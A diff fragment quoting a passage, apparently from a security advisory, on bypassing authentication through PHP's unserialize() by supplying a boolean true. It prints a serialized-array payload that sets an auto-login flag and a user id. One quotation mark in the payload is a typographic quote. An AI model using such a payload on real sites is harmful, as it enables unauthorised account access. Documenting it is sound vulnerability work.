@@ -1,0 +1,4 @@
+“b:1”) to the unserialize() function, it is
+possible to bypass the authentication control:
+a:2:{s:11:"autologinid”;b:1;s:6:"userid";s:1:"2";}
+72
